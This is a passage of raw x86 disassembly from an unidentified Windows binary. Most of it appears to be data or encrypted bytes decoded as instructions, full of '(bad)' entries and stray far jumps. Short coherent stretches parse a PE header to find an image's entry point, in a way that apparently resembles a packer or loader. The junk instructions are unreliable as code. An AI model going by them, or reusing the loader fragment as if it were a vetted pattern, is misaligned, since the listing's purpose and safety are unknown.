  41d65f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d660:	cwde   
  41d661:	xchg   DWORD PTR [ecx],ebp
  41d663:	(bad)  
  41d664:	enter  0x1656,0xf0
  41d668:	mov    esi,0x606971fd
  41d66d:	aam    0x13
  41d66f:	adc    edi,0x50fa0e33
  41d675:	ins    DWORD PTR es:[edi],dx
  41d676:	xchg   DWORD PTR [ecx-0x1d3e0361],edi
  41d67c:	cli    
  41d67d:	xchg   ebx,eax
  41d67e:	jmp    0x41d6d9
  41d680:	mov    bl,0x14
  41d682:	aad    0x8f
  41d684:	shl    DWORD PTR [esi+ebp*8+0x65622a7],cl
  41d68b:	stos   DWORD PTR es:[edi],eax
  41d68c:	inc    ebp
  41d68d:	mov    ebp,0x4bd48748
  41d692:	cmp    al,0xfb
  41d695:	dec    eax
  41d696:	inc    ecx
  41d697:	dec    ebx
  41d698:	je     0x41d645
  41d69a:	fwait
  41d69b:	adc    eax,esi
  41d69d:	addr16 cmc 
  41d69f:	in     eax,dx
  41d6a0:	aaa    
  41d6a1:	pop    ecx
  41d6a2:	cmc    
  41d6a3:	xchg   ebx,eax
  41d6a4:	popa   
  41d6a5:	popf   
  41d6a6:	sbb    BYTE PTR [esp+eiz*8+0x30d5d489],bh
  41d6ad:	mov    al,dh
  41d6af:	mov    ds:0x4c81aa5b,eax
  41d6b4:	fisttp WORD PTR [esi+0x6a]
  41d6b7:	push   ecx
  41d6b8:	and    ch,ah
  41d6ba:	repnz inc edi
  41d6bc:	sbb    eax,0xc69ff4c8
  41d6c1:	push   esi
  41d6c2:	dec    edx
  41d6c3:	loopne 0x41d663
  41d6c5:	call   0xf5c63af
  41d6ca:	rcl    BYTE PTR [ebx],1
  41d6cc:	in     eax,dx
  41d6cd:	ds push ecx
  41d6cf:	stc    
  41d6d0:	div    BYTE PTR [esp+esi*1+0x28]
  41d6d4:	push   es
  41d6d5:	xlat   BYTE PTR ds:[ebx]
  41d6d6:	cmp    eax,0x53b44d72
  41d6db:	cmc    
  41d6dc:	adc    al,0x9c
  41d6de:	fcom   QWORD PTR [esi]
  41d6e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6e1:	aaa    
  41d6e2:	aad    0xb3
  41d6e4:	daa    
  41d6e5:	push   0x6e057ca6
  41d6ea:	test   eax,0xe674dfa1
  41d6ef:	mov    eax,ds:0x2a4751d2
  41d6f4:	mov    WORD PTR [esi-0x44fdfd5e],es
  41d6fa:	pop    esi
  41d6fb:	dec    BYTE PTR [edx+0xc]
  41d6fe:	int    0xdf
  41d700:	adc    al,0x42
  41d702:	test   al,0x9d
  41d704:	clc    
  41d705:	ins    DWORD PTR es:[edi],dx
  41d706:	and    edi,DWORD PTR [edi-0x593b0997]
  41d70c:	mov    bh,0xf5
  41d70e:	adc    esi,edx
  41d710:	mov    BYTE PTR [ebx+0x258bab97],ah
  41d716:	mov    ch,0x69
  41d718:	jecxz  0x41d74d
  41d71a:	in     eax,0xba
  41d71c:	push   ss
  41d71d:	mov    edx,0xaf04d356
  41d722:	mov    cs,WORD PTR [edi-0x29e3e63b]
  41d728:	push   0x67c79ba6
  41d72d:	adc    DWORD PTR [ebx-0x7ef705e8],0x63
  41d734:	aas    
  41d735:	out    dx,eax
  41d736:	cs stos DWORD PTR es:[edi],eax
  41d738:	retf   
  41d739:	int3   
  41d73a:	pop    ss
  41d73b:	or     eax,DWORD PTR [esp+ecx*8+0x71]
  41d73f:	add    al,0xca
  41d741:	push   cs
  41d742:	cmp    eax,0x7c213b45
  41d747:	(bad)  
  41d748:	std    
  41d749:	xor    eax,ecx
  41d74b:	daa    
  41d74c:	push   ebp
  41d74d:	adc    eax,0xd69ebe93
  41d752:	push   esp
  41d753:	and    DWORD PTR [edx+0x2b05ea89],0x51
  41d75a:	dec    ebx
  41d75b:	pop    ss
  41d75c:	cwde   
  41d75d:	add    ebx,edi
  41d75f:	mov    al,ds:0x93c535f
  41d764:	add    al,0x3a
  41d766:	cmp    al,0xc9
  41d768:	jae    0x41d72f
  41d76a:	inc    eax
  41d76b:	cdq    
  41d76c:	test   eax,0xa3935c68
  41d771:	pop    ebp
  41d772:	cmp    eax,0xe7299d66
  41d777:	lods   eax,DWORD PTR ds:[esi]
  41d778:	cmp    BYTE PTR [ecx-0x77],bh
  41d77b:	inc    ebx
  41d77c:	xchg   ebp,eax
  41d77d:	aam    0xfa
  41d77f:	aam    0xcc
  41d781:	jecxz  0x41d76d
  41d783:	jmp    0x3440:0x5d16d100
  41d78a:	push   es
  41d78b:	jne    0x41d713
  41d78d:	(bad)  
  41d78e:	nop
  41d78f:	mov    ds:0x8b1dbee1,al
  41d794:	sub    ch,cl
  41d796:	cli    
  41d797:	daa    
  41d798:	xlat   BYTE PTR ds:[ebx]
  41d799:	pop    ss
  41d79a:	dec    esp
  41d79b:	scas   al,BYTE PTR es:[edi]
  41d79c:	sub    dh,BYTE PTR [edi-0x38]
  41d79f:	and    BYTE PTR [edx+0x1ab2f549],bh
  41d7a5:	loop   0x41d753
  41d7a7:	inc    ecx
  41d7a8:	and    bh,bh
  41d7aa:	push   eax
  41d7ab:	lock sbb edi,edx
  41d7ae:	mov    dl,BYTE PTR [edx]
  41d7b0:	sbb    DWORD PTR [eax-0x7],0x55
  41d7b4:	jns    0x41d810
  41d7b6:	mov    ebp,0x771bb181
  41d7bb:	sbb    ah,al
  41d7bd:	ss mov ecx,0x9242a45
  41d7c3:	mov    ds:0xecb10f2b,al
  41d7c8:	adc    cl,BYTE PTR [eax-0x58]
  41d7cb:	es pop ebx
  41d7cd:	sbb    BYTE PTR [edi-0x1aba1ad],0xb3
  41d7d4:	fidivr WORD PTR [eax-0x5f6096d]
  41d7da:	xchg   ecx,eax
  41d7db:	hlt    
  41d7dc:	sub    al,0x12
  41d7de:	xor    bh,BYTE PTR [edx]
  41d7e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7e1:	div    eax
  41d7e3:	adc    DWORD PTR [ebx+0xc3323f3],edx
  41d7e9:	push   cs
  41d7ea:	lahf   
  41d7eb:	mov    eax,edi
  41d7ed:	add    al,0x8c
  41d7ef:	adc    DWORD PTR [edi],0xb0bcf8ed
  41d7f5:	js     0x41d79c
  41d7f7:	mov    WORD PTR [ecx],?
  41d7f9:	sar    DWORD PTR [edi-0x4ee12d73],1
  41d7ff:	pop    ecx
  41d800:	loope  0x41d802
  41d802:	repz xchg ebx,eax
  41d804:	iret   
  41d805:	push   ss
  41d806:	sbb    ebp,ecx
  41d808:	mov    bh,BYTE PTR [ebp+esi*4-0x5317fff3]
  41d80f:	ja     0x41d88d
  41d811:	xor    al,0xdb
  41d813:	xor    edx,DWORD PTR [edx+0x2484a70f]
  41d819:	mov    ch,dl
  41d81b:	(bad)  
  41d81c:	fnsave [ebp-0x5ac935e2]
  41d822:	and    eax,0xc406b4b4
  41d827:	aaa    
  41d828:	or     dl,bl
  41d82a:	iret   
  41d82b:	mov    DWORD PTR [edx-0x4c2cce4a],ebp
  41d831:	out    dx,eax
  41d832:	retf   
  41d833:	or     eax,0x8707bfc3
  41d838:	cmp    DWORD PTR [edi-0x70],ebp
  41d83b:	add    BYTE PTR [edx],dh
  41d83d:	push   edi
  41d83e:	xlat   BYTE PTR ds:[ebx]
  41d83f:	(bad)  
  41d840:	jmp    0xe1ff:0x9cd44f3
  41d847:	(bad)  
  41d848:	lds    esp,FWORD PTR [esi+0x459ba718]
  41d84e:	loope  0x41d877
  41d850:	lods   eax,DWORD PTR ds:[esi]
  41d851:	dec    esi
  41d852:	pushf  
  41d853:	shr    BYTE PTR [eax+0x37],cl
  41d856:	fs add al,bh
  41d859:	inc    ebx
  41d85a:	push   edx
  41d85b:	push   ecx
  41d85c:	mov    esp,0x5ed285fa
  41d861:	ins    DWORD PTR es:[edi],dx
  41d862:	sub    DWORD PTR [edi-0x7c6a2192],esp
  41d868:	mov    ecx,0x82434dd
  41d86d:	mov    al,ds:0xef2b50d0
  41d872:	pop    ebp
  41d873:	inc    ebp
  41d874:	pop    eax
  41d875:	add    al,0xf2
  41d877:	lahf   
  41d878:	stos   BYTE PTR es:[edi],al
  41d879:	mov    ebp,DWORD PTR [ecx]
  41d87b:	fldcw  WORD PTR [edi+0x7edbb168]
  41d881:	fst    DWORD PTR [eax+ecx*8]
  41d884:	jmp    0x41d8b8
  41d886:	fsub   DWORD PTR [edx-0x6ba6680e]
  41d88c:	xor    dh,BYTE PTR [ebx+ebp*8]
  41d88f:	xchg   ebp,eax
  41d890:	pop    esi
  41d891:	mov    ds,WORD PTR [edx-0x3932b2b9]
  41d897:	fdiv   DWORD PTR [esi+0x6bc3cd7d]
  41d89d:	dec    BYTE PTR [si]
  41d8a0:	pushf  
  41d8a1:	jp     0x41d85e
  41d8a3:	pop    ds
  41d8a4:	imul   ebx,ebx,0xffffffd3
  41d8a7:	ror    DWORD PTR [ebx-0x3b],1
  41d8aa:	jmp    0xd79d:0x619b4089
  41d8b1:	pop    eax
  41d8b2:	push   0xffffffb7
  41d8b4:	pop    edx
  41d8b5:	cmp    BYTE PTR [eax+0x4a],bh
  41d8b8:	mov    al,ds:0x7f101ed9
  41d8bd:	push   eax
  41d8be:	sbb    BYTE PTR [ecx],dl
  41d8c0:	mov    dl,0xa8
  41d8c2:	or     esi,esi
  41d8c4:	mov    esp,0x4b1266f4
  41d8c9:	iret   
  41d8ca:	js     0x41d8c2
  41d8cc:	jmp    0x41d8bc
  41d8ce:	cmc    
  41d8cf:	(bad)  
  41d8d0:	stos   DWORD PTR es:[edi],eax
  41d8d1:	sbb    eax,0x5e1e3e17
  41d8d6:	inc    ebx
  41d8d7:	mov    dl,0xc1
  41d8d9:	gs inc eax
  41d8db:	add    ch,BYTE PTR [esi+0x74]
  41d8de:	xchg   DWORD PTR [ebp+0x53],ebp
  41d8e1:	dec    esp
  41d8e2:	cld    
  41d8e3:	ins    BYTE PTR es:[di],dx
  41d8e5:	cmp    eax,0x1770f67b
  41d8ea:	add    ebp,DWORD PTR [esi-0x3f3728da]
  41d8f0:	popa   
  41d8f1:	daa    
  41d8f2:	or     al,0x40
  41d8f4:	out    dx,al
  41d8f5:	(bad)  
  41d8f7:	test   eax,0x829cf8d6
  41d8fc:	or     cl,ah
  41d8fe:	ins    DWORD PTR es:[edi],dx
  41d8ff:	and    eax,0x4d93557a
  41d904:	fild   QWORD PTR [ebx]
  41d906:	mov    ah,0xeb
  41d908:	mov    edx,DWORD PTR [esp+0x18]
  41d90c:	mov    edi,DWORD PTR [esp+0x1c]
  41d910:	add    eax,edx
  41d912:	adc    ecx,edi
  41d914:	mov    DWORD PTR [esp+0x18],eax
  41d918:	mov    DWORD PTR [esp+0x1c],ecx
  41d91c:	jmp    0x41d926
  41d921:	mov    ebx,0xca79a575
  41d926:	push   0x4
  41d928:	push   0x422518
  41d92d:	jmp    0x41dcfc
  41d932:	mov    cl,0x3a
  41d934:	cdq    
  41d935:	lahf   
  41d936:	bound  ebx,QWORD PTR [edx-0x24cc5e1]
  41d93c:	mov    ds:0xebf821bc,eax
  41d941:	mov    esi,0x18164d7f
  41d946:	mov    esp,0x61181812
  41d94b:	pop    edx
  41d94c:	gs clc 
  41d94e:	xchg   ebp,eax
  41d94f:	or     esi,ebx
  41d951:	xchg   edx,eax
  41d952:	test   al,0x7a
  41d954:	pop    edx
  41d955:	and    DWORD PTR [edx-0x8adf924],0x19
  41d95c:	mov    bh,0xba
  41d95e:	lds    ebp,FWORD PTR [ebx+ebx*8-0x1e97b56d]
  41d965:	mov    al,ds:0xdd84ba0d
  41d96a:	shr    DWORD PTR [esi-0x19],cl
  41d96d:	xchg   esi,eax
  41d96e:	mov    eax,ds:0x11843c75
  41d973:	jo     0x41d9eb
  41d975:	dec    ebp
  41d976:	mov    ebx,0x8855e09f
  41d97b:	int3   
  41d97c:	test   DWORD PTR [eax-0x15],edx
  41d97f:	push   ecx
  41d980:	xor    edi,edi
  41d982:	loopne 0x41d97b
  41d984:	push   0xffffff95
  41d986:	ret    
  41d987:	ins    BYTE PTR es:[edi],dx
  41d988:	mov    dl,0xf8
  41d98a:	lods   eax,DWORD PTR ds:[esi]
  41d98b:	xlat   BYTE PTR es:[ebx]
  41d98d:	repz les ebx,FWORD PTR [ecx+0x49]
  41d991:	mov    bl,0xd
  41d993:	push   esi
  41d994:	ins    BYTE PTR es:[edi],dx
  41d995:	out    0x2d,al
  41d997:	aas    
  41d998:	fwait
  41d999:	popa   
  41d99a:	mov    esp,DWORD PTR [ebx+0x56]
  41d99d:	sbb    ebx,DWORD PTR [ecx]
  41d99f:	lods   eax,DWORD PTR ds:[esi]
  41d9a0:	lods   eax,DWORD PTR ds:[si]
  41d9a2:	mov    dl,0xa0
  41d9a4:	add    eax,0x5d673578
  41d9a9:	dec    ebx
  41d9aa:	ja     0x41da05
  41d9ac:	in     al,dx
  41d9ad:	jno    0x41d964
  41d9af:	push   edx
  41d9b0:	std    
  41d9b1:	and    ah,0x21
  41d9b4:	and    eax,DWORD PTR [esi-0x70]
  41d9b7:	fild   DWORD PTR [edx+0x56]
  41d9ba:	adc    BYTE PTR ds:0x9bd3f3fe,ah
  41d9c0:	pop    ss
  41d9c1:	or     BYTE PTR [ebp-0x74],bl
  41d9c4:	jecxz  0x41da27
  41d9c6:	loopne 0x41d9cd
  41d9c8:	lds    ebp,FWORD PTR [edi]
  41d9ca:	sub    cl,BYTE PTR [edi-0x50a5dae0]
  41d9d0:	xor    al,0x4f
  41d9d2:	xor    ebx,DWORD PTR [esp+edx*8+0x3af2e892]
  41d9d9:	lds    ecx,FWORD PTR [edi]
  41d9db:	sbb    BYTE PTR [esi-0x1f340c99],0x3f
  41d9e2:	arpl   WORD PTR [edi],bp
  41d9e4:	push   ecx
  41d9e5:	mov    ah,0x2b
  41d9e7:	cld    
  41d9e8:	stos   DWORD PTR es:[edi],eax
  41d9e9:	test   eax,0xade30819
  41d9ee:	icebp  
  41d9ef:	pusha  
  41d9f0:	mov    edx,0xf8f37fe5
  41d9f5:	(bad)  
  41d9f6:	stos   DWORD PTR es:[edi],eax
  41d9f7:	adc    ecx,esi
  41d9f9:	xchg   edi,eax
  41d9fa:	dec    ecx
  41d9fb:	gs jmp 0xbf8b:0x7f4c0545
  41da03:	cli    
  41da04:	les    ebp,FWORD PTR [edi-0x10]
  41da07:	nop
  41da08:	sub    bl,0xc3
  41da0b:	mov    ds:0xb03a4065,eax
  41da10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da11:	adc    BYTE PTR [esi+0x12],ah
  41da14:	mov    dh,0x83
  41da16:	fdiv   st(0),st
  41da18:	or     eax,0xc501f735
  41da1d:	lds    edx,FWORD PTR [ebp-0xe8f7dd1]
  41da23:	test   al,0x1b
  41da25:	ds sbb al,0x35
  41da28:	mov    esi,DWORD PTR [eax-0x51]
  41da2b:	mov    dl,0xd4
  41da2d:	pusha  
  41da2e:	jle    0x41d9d6
  41da30:	xchg   ebx,eax
  41da31:	aaa    
  41da32:	dec    ecx
  41da33:	pop    ecx
  41da34:	test   eax,0x249a2453
  41da39:	mov    eax,0x5727a44b
  41da3e:	mov    ?,edi
  41da40:	sub    al,0xaf
  41da42:	push   ss
  41da43:	call   0x8189:0x493d0fa8
  41da4a:	dec    esp
  41da4b:	jnp    0x41dab6
  41da4d:	in     eax,0xae
  41da4f:	in     ax,dx
  41da51:	jo     0x41da5e
  41da53:	mov    al,ds:0x19188cd7
  41da58:	test   BYTE PTR [ebx+0x2c803d7d],bh
  41da5e:	xlat   BYTE PTR ds:[ebx]
  41da5f:	dec    esi
  41da60:	push   ss
  41da61:	mov    esi,0x7454abdf
  41da66:	lods   eax,DWORD PTR ds:[esi]
  41da67:	mov    es,WORD PTR [ecx]
  41da69:	jb     0x41da96
  41da6b:	lock xchg ebp,eax
  41da6d:	in     al,0x65
  41da6f:	out    dx,al
  41da70:	inc    ebp
  41da71:	add    DWORD PTR [ebx],ecx
  41da73:	xchg   esp,eax
  41da74:	cld    
  41da75:	sbb    eax,0x36671d2
  41da7a:	xlat   BYTE PTR ds:[ebx]
  41da7b:	addr16 pop ebp
  41da7d:	sti    
  41da7e:	outs   dx,DWORD PTR ds:[esi]
  41da7f:	mov    al,ds:0x53f87a6a
  41da84:	lahf   
  41da85:	cmc    
  41da86:	mov    ah,BYTE PTR [ebp+edx*8+0x583aa531]
  41da8d:	sub    esi,DWORD PTR [ecx]
  41da8f:	sbb    al,0xcf
  41da91:	mov    eax,0x82c15860
  41da96:	in     al,dx
  41da97:	and    al,0xa8
  41da99:	nop
  41da9a:	pop    ss
  41da9b:	cmp    dl,BYTE PTR [edx-0x4d6370ce]
  41daa1:	push   cs
  41daa2:	test   eax,0x88e3adea
  41daa7:	jge    0x41dadd
  41daa9:	or     edi,DWORD PTR [ebp-0x2e]
  41daac:	jns    0x41dacc
  41daae:	inc    eax
  41daaf:	add    DWORD PTR [eax+esi*1-0x232680df],ecx
  41dab6:	addr16 imul ebx,ebp,0x409d1ccf
  41dabd:	fdiv   QWORD PTR [edx]
  41dabf:	mov    cl,0x72
  41dac1:	add    esp,DWORD PTR [edx+eax*2]
  41dac4:	and    eax,0xa672cb33
  41dac9:	mov    cl,0x1d
  41dacb:	push   ebp
  41dacc:	icebp  
  41dacd:	xor    DWORD PTR [eax],esp
  41dacf:	xchg   ebx,eax
  41dad0:	sub    DWORD PTR [ecx],eax
  41dad2:	mov    cl,0x73
  41dad4:	rcl    bh,cl
  41dad6:	shl    ebp,0xa
  41dad9:	punpckhdq mm0,QWORD PTR [ecx-0x1819ff4b]
  41dae0:	dec    ebx
  41dae1:	js     0x41db35
  41dae3:	sbb    eax,0xc14f73f
  41dae8:	dec    ebx
  41dae9:	sbb    al,0x3b
  41daeb:	ds push ss
  41daed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daee:	call   DWORD PTR [esi+0x73296fe3]
  41daf4:	cwde   
  41daf5:	hlt    
  41daf6:	(bad)  
  41daf7:	out    0x9e,eax
  41daf9:	mov    bl,BYTE PTR [edx-0x58]
  41dafc:	xor    al,al
  41dafe:	and    ch,dl
  41db00:	jae    0x41db35
  41db02:	scas   al,BYTE PTR es:[edi]
  41db03:	pop    ss
  41db04:	mov    WORD PTR [edx-0x33],?
  41db07:	and    DWORD PTR [ebp+0x759368cf],ebp
  41db0d:	pushf  
  41db0e:	fs bnd call 0xb4cc9718
  41db15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db16:	or     edx,DWORD PTR [ebx+ebx*8]
  41db19:	cli    
  41db1a:	cmp    eax,0xa5a17968
  41db1f:	push   0xba2eec35
  41db24:	xor    al,0x2b
  41db26:	mov    dl,0xb5
  41db28:	sub    BYTE PTR [eax+0x30],ch
  41db2b:	jno    0x41db50
  41db2d:	dec    ebp
  41db2e:	adc    BYTE PTR [esi-0x23],cl
  41db31:	clc    
  41db32:	jmp    0x1f7b1301
  41db37:	pop    esi
  41db38:	(bad)  
  41db39:	push   esi
  41db3a:	call   0x2950:0xa0920830
  41db41:	mov    edi,esi
  41db43:	pop    ds
  41db44:	mov    cl,0xeb
  41db46:	and    al,BYTE PTR [ecx-0x2aff304d]
  41db4c:	enter  0xfeb0,0x6f
  41db50:	stc    
  41db51:	scas   al,BYTE PTR es:[edi]
  41db52:	scas   eax,DWORD PTR es:[edi]
  41db53:	test   al,0xaa
  41db55:	cmp    al,0x84
  41db57:	mov    ebx,0x3ac09741
  41db5c:	das    
  41db5d:	xor    cl,BYTE PTR [edx+0x61c758d3]
  41db63:	jo     0x41dbbb
  41db65:	sbb    dh,BYTE PTR [eax+0x7]
  41db68:	ret    0x45a4
  41db6b:	adc    BYTE PTR [edi+0x4bc0bc27],0x35
  41db72:	xor    eax,0x9ad8d942
  41db77:	pusha  
  41db78:	lea    esp,[edx-0x6b8b36e1]
  41db7e:	sbb    eax,0x73c6b806
  41db83:	mov    dl,0xc3
  41db85:	adc    eax,0x2733d9b4
  41db8a:	(bad)  
  41db8b:	ja     0x41dba8
  41db8d:	push   0xffffff94
  41db8f:	scas   eax,DWORD PTR es:[edi]
  41db90:	xor    DWORD PTR [esi+0x171ed0fa],ebp
  41db96:	xor    eax,0x81fb0cc4
  41db9b:	xchg   ecx,eax
  41db9c:	test   DWORD PTR [edx],edx
  41db9e:	out    dx,al
  41db9f:	xchg   edx,eax
  41dba0:	adc    al,0x71
  41dba2:	(bad)  
  41dba3:	sti    
  41dba4:	mov    ch,0x41
  41dba6:	fimul  WORD PTR [ebp+0xe689cb6]
  41dbac:	xchg   ebx,eax
  41dbad:	add    dh,BYTE PTR [edi+0x20]
  41dbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbb1:	sbb    eax,0x4f21592e
  41dbb6:	in     al,0xc4
  41dbb8:	ror    esi,0x45
  41dbbb:	mov    eax,ds:0x5792042e
  41dbc0:	out    0x89,eax
  41dbc2:	and    BYTE PTR [ebx+0x37],ch
  41dbc5:	and    ecx,DWORD PTR [ecx]
  41dbc7:	call   0x45cfc37d
  41dbcc:	sbb    bl,bl
  41dbce:	add    DWORD PTR ss:[ebp-0x15749073],esp
  41dbd5:	xchg   ebx,eax
  41dbd6:	shr    BYTE PTR [edi+0x67],1
  41dbd9:	add    BYTE PTR [esi-0x884f157],dh
  41dbdf:	mov    eax,db2
  41dbe2:	imul   eax,DWORD PTR [esi],0x44
  41dbe5:	fdiv   QWORD PTR [edx-0x2a]
  41dbe8:	inc    edi
  41dbe9:	mov    dh,0x8f
  41dbeb:	jp     0x41dbde
  41dbed:	loopne 0x41dbce
  41dbef:	(bad)  
  41dbf0:	mov    bl,0x18
  41dbf2:	stos   BYTE PTR es:[edi],al
  41dbf3:	or     edi,DWORD PTR [ecx-0x31]
  41dbf6:	sub    DWORD PTR [esi-0x2],edx
  41dbf9:	sbb    DWORD PTR [edx],edx
  41dbfb:	add    eax,0x53750a1b
  41dc00:	inc    edx
  41dc01:	mov    edx,0x6390505c
  41dc06:	jno    0x41db8a
  41dc08:	mov    cl,0x58
  41dc0a:	dec    ebx
  41dc0b:	cmp    eax,0xa8ca84f7
  41dc10:	test   dh,0xef
  41dc13:	arpl   WORD PTR [edi+0x30],dx
  41dc16:	sub    eax,0xedf0dd01
  41dc1b:	push   es
  41dc1c:	sahf   
  41dc1d:	(bad)  [esi]
  41dc1f:	xor    edi,DWORD PTR [eax-0x71161fd1]
  41dc25:	xchg   edi,eax
  41dc26:	mov    eax,ds:0xe8553f20
  41dc2b:	mov    edi,0x321ad5e9
  41dc30:	pop    ebp
  41dc31:	jge    0x41dc11
  41dc33:	pop    ds
  41dc34:	pushw  es
  41dc36:	mov    DWORD PTR gs:[esi],esp
  41dc39:	sub    eax,0x888a1bc1
  41dc3e:	or     DWORD PTR [eax+0x7d],esi
  41dc41:	test   eax,0x866220ad
  41dc46:	shl    BYTE PTR [esi+0x2a2ca85e],cl
  41dc4c:	mov    ?,WORD PTR [ebx+0x66]
  41dc4f:	mov    dh,bh
  41dc51:	ret    0xaab5
  41dc54:	xchg   ebp,eax
  41dc55:	mov    edi,DWORD PTR [ecx]
  41dc57:	mov    cl,0xa6
  41dc59:	or     al,0x95
  41dc5b:	div    DWORD PTR [ebp*1-0x2e6c3fc1]
  41dc62:	mov    BYTE PTR [edi],bh
  41dc64:	in     eax,dx
  41dc65:	mov    edi,0x94b4ed81
  41dc6a:	fadd   QWORD PTR [edx+0x46]
  41dc6d:	ret    
  41dc6e:	int3   
  41dc6f:	mov    bh,0xb7
  41dc71:	nop
  41dc72:	and    eax,0x7cd5a993
  41dc77:	test   BYTE PTR [ebp-0x2f6ed9c4],bh
  41dc7d:	jg     0x41dcea
  41dc7f:	test   eax,0x9f6d2eb0
  41dc84:	push   0xfffffffe
  41dc86:	sub    al,0x11
  41dc88:	and    eax,0x5201e78e
  41dc8d:	jnp    0x41dc8f
  41dc8f:	cmp    DWORD PTR [edx-0x10dd6cc6],ebp
  41dc95:	xor    edi,DWORD PTR [ebp+0x32e4f77]
  41dc9b:	fadd   QWORD PTR [ebx+0x450ab8ac]
  41dca1:	mov    dl,0x36
  41dca3:	imul   ecx,DWORD PTR [edi+0x2196dc1],0x5b97253e
  41dcad:	and    edi,DWORD PTR [ebx-0x20]
  41dcb0:	mov    ebp,0x12a1e0bb
  41dcb5:	sbb    esi,DWORD PTR [esi+0x5a1faf67]
  41dcbb:	aad    0xd3
  41dcbd:	sbb    al,cl
  41dcbf:	mov    ebx,0x36b8c227
  41dcc4:	call   0x4c3d2edd
  41dcc9:	and    bl,BYTE PTR [ecx-0x7f7f4ed6]
  41dccf:	fsubp  st(0),st
  41dcd1:	rcl    DWORD PTR [ebp-0x145e5fe1],1
  41dcd7:	lea    edx,[edx]
  41dcd9:	cmp    al,0x6
  41dcdb:	(bad)  
  41dcdc:	mov    esp,0x2a459498
  41dce1:	push   ecx
  41dce2:	push   ss
  41dce3:	(bad)  
  41dce4:	jo     0x41dca8
  41dce6:	push   ecx
  41dce7:	(bad)
  41dceb:	clc    
  41dcec:	mov    dl,0xe3
  41dcee:	stc    
  41dcef:	mov    ch,0x86
  41dcf1:	pushf  
  41dcf2:	push   esi
  41dcf3:	sub    al,0x78
  41dcf5:	xchg   edi,eax
  41dcf6:	daa    
  41dcf7:	je     0x41dd1e
  41dcf9:	int    0xe0
  41dcfb:	dec    BYTE PTR [ebp+0x506c2444]
  41dd01:	call   0x415231
  41dd06:	mov    eax,DWORD PTR [esp+0x64]
  41dd0a:	push   0x4
  41dd0c:	push   DWORD PTR [eax+0x1a4]
  41dd12:	lea    eax,[esp+0x74]
  41dd16:	push   eax
  41dd17:	call   0x415231
  41dd1c:	mov    eax,DWORD PTR [esp+0x64]
  41dd20:	mov    eax,DWORD PTR [eax+0x1a4]
  41dd26:	mov    eax,DWORD PTR [eax]
  41dd28:	mov    ecx,DWORD PTR [esp+0x64]
  41dd2c:	mov    eax,DWORD PTR [eax+0x3c]
  41dd2f:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41dd35:	mov    ecx,DWORD PTR [ecx]
  41dd37:	lea    eax,[ecx+eax*1+0x28]
  41dd3b:	mov    eax,DWORD PTR [eax]
  41dd3d:	add    DWORD PTR [esp+0x6c],eax
  41dd41:	mov    DWORD PTR [esp+0x30],0x127
  41dd49:	jmp    0x41e118
  41dd4e:	dec    edi
  41dd4f:	inc    eax
  41dd50:	mov    ds:0x3a6ba279,al
  41dd55:	push   ds
  41dd56:	(bad)  
  41dd57:	push   edx
  41dd59:	push   0xfffffff0
  41dd5b:	or     esp,DWORD PTR [ecx+0x16472270]
  41dd61:	sbb    BYTE PTR [edx+edx*1+0x151e1818],bh
  41dd68:	xor    BYTE PTR [eax],dh
  41dd6a:	adc    bl,al
  41dd6c:	or     al,0xa4
  41dd6e:	loope  0x41dde5
  41dd70:	mov    WORD PTR [ecx-0x995bc09],es
  41dd76:	dec    ebx
  41dd77:	jae    0x41ddad
  41dd79:	add    BYTE PTR ds:0x108931f2,ch
  41dd80:	retf   
  41dd81:	sbb    al,0x5c
  41dd83:	cmp    al,0x10
  41dd85:	sahf   
  41dd86:	mov    dh,bl
  41dd88:	pushf  
  41dd89:	dec    ebp
  41dd8a:	arpl   WORD PTR [edi],di
  41dd8c:	dec    edx
  41dd8d:	mov    edx,ebp
  41dd8f:	xor    eax,0xf3d6490
  41dd94:	sbb    esp,ebp
  41dd96:	and    dh,BYTE PTR ds:0x8aa7f703
  41dd9c:	rcr    DWORD PTR [ebx-0x7290d34a],cl
  41dda2:	mov    ch,0x6b
  41dda4:	scas   eax,DWORD PTR es:[edi]
  41dda5:	(bad)
  41dda9:	out    dx,eax
  41ddaa:	sar    edi,1
  41ddac:	int    0xdc
  41ddae:	or     ecx,DWORD PTR [eax-0x7907bcfc]
  41ddb4:	push   ss
  41ddb5:	(bad)  
  41ddb6:	imul   esi,DWORD PTR [edx+ebx*4-0x48734cc8],0xffffffc8
  41ddbe:	jns    0x41ddd0
  41ddc0:	out    dx,eax
  41ddc1:	call   0xe84a:0x13bc9673
  41ddc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddc9:	and    al,BYTE PTR [ebx]
  41ddcb:	iret   
  41ddcc:	inc    esi
  41ddcd:	fimul  DWORD PTR [ecx+0xbcf48f4]
  41ddd3:	dec    esi
  41ddd4:	ss adc edi,ebx
  41ddd7:	lods   al,BYTE PTR ds:[esi]
  41ddd8:	(bad)  
  41ddd9:	jns    0x41ddea
  41dddb:	into   
  41dddc:	fcmovnu st,st(4)
  41ddde:	sbb    al,BYTE PTR [ebx-0x17]
  41dde1:	jno    0x41dd7c
  41dde3:	ins    BYTE PTR es:[edi],dx
  41dde4:	jecxz  0x41de0d
  41dde6:	pop    ds
  41dde7:	push   eax
  41dde8:	in     eax,dx
  41dde9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddea:	push   es
  41ddeb:	repnz sub esi,DWORD PTR [eax+ecx*2+0x71ca81b3]
  41ddf3:	and    eax,0xc801dba4
  41ddf8:	mov    bh,0x1d
  41ddfa:	call   FWORD PTR [esi-0x5d81f153]
  41de00:	add    BYTE PTR [ecx+esi*8],0x86
  41de04:	sbb    al,0x42
  41de06:	sahf   
  41de07:	std    
  41de08:	(bad)  
  41de09:	into   
  41de0a:	or     BYTE PTR [eax-0x242c1c80],bl
  41de10:	add    al,0xf0
  41de12:	add    edi,ebp
  41de14:	jecxz  0x41de6b
  41de16:	dec    eax
  41de17:	adc    BYTE PTR [ebp+0x60],ch
  41de1a:	out    dx,al
  41de1b:	add    DWORD PTR ds:0x1787ec45,ebp
  41de21:	and    eax,DWORD PTR [esi]
  41de23:	popa   
  41de24:	dec    ecx
